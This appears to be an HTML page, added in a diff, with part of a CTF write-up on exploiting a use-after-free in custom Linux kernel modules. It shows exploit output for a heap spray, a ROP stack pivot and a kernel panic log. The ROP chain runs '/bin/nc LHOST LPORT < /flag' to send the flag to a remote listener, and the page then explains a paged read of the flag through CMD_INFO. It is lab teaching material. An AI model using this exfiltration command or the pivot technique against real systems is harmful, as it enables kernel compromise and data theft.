+    pivot_fn   = 0xffffffffc00d4020  (nkrcu_pivot)
+    kernel_base = 0xffffffffae200000
+
+[2] Pre-spray strings + ROP (desc alive)
+    str_kaddr  = 0xffffa00a41b6f380
+    rop_kaddr  = 0xffffa00a41b6f300  (attempt 1)
+
+[3] UAF: SNAP + REMOVE + SYNC
+    snap_id = 0x0000000000000001  (snap-&gt;desc = desc_kaddr)
+    REMOVE ok -- call_rcu() scheduled
+    SYNC: waiting for RCU grace period...
+    done -- desc_kaddr FREED, snap-&gt;desc DANGLING
+
+[4] Spray fake_desc into freed slot
+    [+] LANDED at 0xffffa00a41b6f400 (attempt 1)
+
+[5] Waiting for nkmon trigger (&lt;=5s)
+
+    nkmon workqueue:
+      snap-&gt;desc-&gt;ops-&gt;validate(desc_kaddr)
+      = nkrcu_pivot(rdi=desc_kaddr)
+      mov rsp,[rdi]  -&gt;  rsp = rop_kaddr
+      call_usermodehelper('/bin/sh',['-c','/bin/nc LHOST LPORT &lt; /flag'],NULL,2)
+      UMH_WAIT_PROC blocks until nc exits
+[+] done -- flag should be in your listener</code></pre>
+          <p>The exploit never sees the flag — it arrives on the listener:</p>
+          <pre><code>Connection received on 172.17.0.2 47352
+CTF{&lt;64 hex chars&gt;}</code></pre>
+          <p>Then <code>call_usermodehelper</code> returns, the final <code>ret</code> loads zero from <code>rop_kaddr+72</code>, and the box panics. From an earlier boot, so the addresses differ from the run above:</p>
+          <pre><code>[   19.591444] BUG: kernel NULL pointer dereference, address: 0000000000000000
+[   19.591459] #PF: supervisor instruction fetch in kernel mode
+[   19.591459] CPU: 0 PID: 40 Comm: kworker/0:2 Tainted: G           O       6.1.184 #1
+[   19.591459] Workqueue: events nk_mon_work_fn [nkmon]
+[   19.591459] RIP: 0010:0x0
+[   19.591459] RSP: 0018:ffff9ef541f6f350 EFLAGS: 00000296
+[   19.591459] RAX: 0000000000000000 RBX: ffffad17801a7dd0 RCX: 0000000000000000
+[   19.591459] R13: ffffad17801a7dd0 R14: 0000000000000000 R15: ffff9ef57ec2d605
+[   19.591459] Call Trace:
+[   19.591459] Modules linked in: nknet(O) nkmon(O) nkrcu(O)</code></pre>
+          <div class="note">
+            <code>RSP</code> is a direct-map heap address while <code>RBX</code> is the vmalloc'd kworker stack holding <code>local[]</code> — the stack was pivoted onto the heap. The call trace is empty because the unwinder has nothing left to walk. Panicking on success is deliberate: a solved instance dies instead of lingering as a rooted box.
+          </div>
+        </section>
+
+        <section id="info">
+          <h2>Reading the flag without a listener</h2>
+          <p>The intended exfiltration needs the VM to reach the player, which means a routable address — a VPS or a tunnel, not a NAT'd home IP. A team without one has kernel code execution and no way out.</p>
+          <p>One team went through <code>CMD_INFO</code> instead. The read primitive is rigid:</p>
+          <pre><code>int nkrcu_info(uint64_t desc_id, uint8_t *out, size_t out_len)
+{
+    if (out_len &lt; 40)
+        return -EINVAL;
+
+    rcu_read_lock();
+    desc = nk_find_desc_rcu(desc_id);
+    ...
+    memcpy(out, desc, 40);</code></pre>
+          <p>There is no offset parameter on that path. Not on the wire — the payload is consumed as one 8-byte id, and trailing bytes are ignored.</p>
+          <p>Not in the API either. <code>out_len</code> is a destination capacity used as a lower bound, hardcoded to 40 by the caller. The <code>memcpy</code> length is the literal 40, and the source offset is always zero.</p>
+          <p>The first 16 bytes are identity and state, leaving 24 bytes of payload per call. The flag is 69 characters, so it takes three reads.</p>
+          <div class="note">
+            Because the read window cannot move, the paging has to happen on the write side. A solver cannot ask for bytes 24 to 47 of an object — only for bytes 0 to 39 of some object. Each page needs a fresh round of kernel execution, copying a different slice into the same fixed window, and the response carries no offset marker.
+          </div>
+          <p>During the CTF this surfaced as a team reporting a wrong flag. What they had was <code>CTF{</code> plus 20 hex characters — a correct prefix, truncated at the read boundary, with nothing in the reply to say so.</p>
+          <p>Two constraints fall out of the code. The read target has to be a descriptor linked into <code>nk_list</code>, because <code>nk_find_desc_rcu</code> is the only lookup any command has — spray buffers are not in that list. And writing flag ASCII over <code>+16</code> destroys <code>ops</code>, so the read target must not be the snapshotted descriptor.</p>
+        </section>
+
+      </article>
+
+      <footer class="site-footer">
+        <p>2026 &copy; Alexandru Hossu</p>
+      </footer>
+
+    </div>
+  </body>
+</html>
